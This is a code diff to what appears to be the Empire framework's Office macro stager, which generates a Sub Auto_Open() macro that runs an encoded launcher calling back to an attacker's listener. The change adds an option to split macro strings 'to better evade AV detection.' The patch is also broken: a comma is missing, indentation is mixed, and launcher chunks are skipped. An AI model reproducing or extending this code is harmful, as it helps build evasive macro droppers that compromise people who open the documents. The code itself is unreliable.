@@ -7,7 +7,7 @@ class Stager:
         self.info = {
             'Name': 'Macro',
 
-            'Author': ['@enigma0x3', '@harmj0y'],
+            'Author': ['@enigma0x3', '@harmj0y', '@benichmt1']
 
             'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),
 
@@ -49,7 +49,12 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            }
+            },
+            'Obfuscation' : {
+		'Description'   :   'Split up macro strings to better evade AV detection',
+		'Required'      :   False,
+                'Value'         :   'False'
+	    }
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -71,6 +76,7 @@ class Stager:
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
+	    obfuscation = self.options['Obfuscation']['Value']
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
@@ -81,8 +87,14 @@ class Stager:
         else:
             chunks = list(helpers.chunks(launcher, 50))
             payload = "\tDim Str As String\n"
-            payload += "\tstr = \"" + str(chunks[0]) + "\"\n"
-            for chunk in chunks[1:]:
+	    if obfuscation == 'True' or obfuscation == 'true':
+		block = list(chunks[0])
+		payload += "\tstr = \"" +  block[0] + "\"\n"
+		for letters in block[1:]:
+			payload += "\tstr = str + \"" + letters + "\"\n"
+	    else:		 
+            	payload += "\tstr = \"" + str(chunks[1]) + "\"\n"
+            for chunk in chunks[2:]:
                 payload += "\tstr = str + \"" + str(chunk) + "\"\n"
 
             macro = "Sub Auto_Open()\n"
